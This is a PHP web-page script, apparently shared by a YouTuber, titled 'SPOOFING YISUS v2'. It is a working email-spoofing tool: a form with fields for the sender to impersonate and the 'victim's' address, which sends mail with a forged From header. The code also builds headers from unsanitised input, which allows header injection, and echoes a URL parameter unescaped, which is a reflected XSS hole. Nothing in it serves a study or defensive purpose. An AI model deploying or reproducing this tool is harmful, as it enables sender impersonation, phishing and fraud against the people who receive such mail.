<?php
session_start();
if ($_POST['Submit'] == 'Send')
{
if (strcmp(md5($_POST['user_code']),$_SESSION['ckey']))
	{ 
header("Location: sendmail.php?msg=ERROR: Invalid Verification Code");
exit();
  } 

$to = $_POST['toemail'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$fromemail = $_POST['fromemail'];
$fromname = $_POST['fromname'];
$lt= '<';
$gt= '>';
$sp= ' ';
$from= 'From:';
$headers = $from.$fromname.$sp.$lt.$fromemail.$gt;
mail($to,$subject,$message,$headers);
header("Location: sendmail.php?msg= Enviado!");
exit();
}
?>
<html>
<head>
<title>SPOOFING YISUS v2</title>
</head>
<style type="text/css">
	h2,h3{
		color: #8CDEF4;
		font-family: monospace;

	}

</style>
<body bgcolor="#717171">

<h2 align="center">
Yisus xd
</h2>
<h3 align="center">
SUSCRIBETE A MI CANAL
</h3><br>
<center>
<p style="margin-left:15px">
<form action="sendmail.php" method="POST">
<b>Nombre del Correo</b><br>
<input type="text" name="fromname" size="50"><br>
<br><b>Correo a suplantar</b><br>
<input type="text" name="fromemail" size="50"><br>
<br><b>Correo de la Victima</b><br>
<input type="text" name="toemail" size="50"><br>
<br><b>Asunto</b><br>
<input type="text" name="subject" size="74"><br>
<br><b>Mensaje</b><br>
<textarea name="message" rows="5" cols="50">
</textarea><br>
<br><b>Prueba que no eres ROBOT :D</b><br>
<input name="user_code" type="text" size="25">  
<img src="pngimg.php" align="middle"><br><br>
<input type="submit" name="Submit" value="Send">
<input type="reset" value="Reset">
</form>
</p>
<?php if (isset($_GET['msg'])) { echo "<font color=\"red\"><h3 align=\"center\"> $_GET[msg] </h3></font>"; } ?>
<h3 align="center">
GRACIAS POR PROBARLO,PASATE A MI CANAL :D
</h3>
<label>CANAL DE YOUTUBE</label>
<a href="https://www.youtube.com/channel/UCLzeiIb0ogm66zdTlTnozpg">VISITAR CANAL</a>
</center>
</body>
</html>

